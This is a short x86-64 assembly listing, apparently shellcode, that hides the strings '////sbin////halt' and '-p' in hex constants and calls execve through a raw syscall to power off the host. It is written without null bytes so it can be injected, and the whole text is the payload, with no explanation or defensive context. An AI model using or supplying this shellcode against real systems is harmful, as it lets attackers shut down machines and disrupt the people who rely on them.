;command is /sbin/halt -p

global _start

_start:
	xor rax, rax
	push rax
	push word 0x702d 
	mov rcx, rsp

	push rax
	mov r8, 0x746c61682f2f2f2f 
	mov r10, 0x6e6962732f2f2f2f
	push r8
	push r10
	mov rdi, rsp

	push rax
	push rcx
	push rdi	
	mov rsi, rsp	

	add rax, 59
	syscall
